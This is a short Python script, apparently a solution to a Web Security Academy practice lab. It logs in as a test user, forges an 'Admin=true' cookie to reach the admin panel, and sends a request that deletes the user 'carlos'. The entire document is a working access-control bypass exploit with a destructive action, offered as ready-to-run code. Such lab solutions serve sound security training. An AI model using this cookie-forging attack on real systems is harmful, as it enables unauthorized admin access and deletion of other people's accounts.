import requests
from bs4 import BeautifulSoup

s = requests.Session()
site = '0a56002c03f2a92080ab08720066008e.web-security-academy.net'
login_url = f'https://{site}/login'

# Get CSRF and login
resp = s.get(login_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

logindata = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter'
}
s.post(login_url, data=logindata)

# Set the Admin cookie
cookie_obj = requests.cookies.create_cookie(domain=site, name='Admin', value='true')
s.cookies.set_cookie(cookie_obj)

# Access admin panel
admin_url = f'https://{site}/admin'
resp = s.get(admin_url)
soup = BeautifulSoup(resp.text, 'html.parser')

# More reliable way to find Carlos delete link
carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href', '')]

if carlos_delete_link:
    delete_uri = carlos_delete_link[0]['href']
    delete_url = f'https://{site}{delete_uri}'
    s.get(delete_url)
    print(f"[+] Sent delete request: {delete_url}")
else:
    print("[!] Could not find delete link for Carlos.")
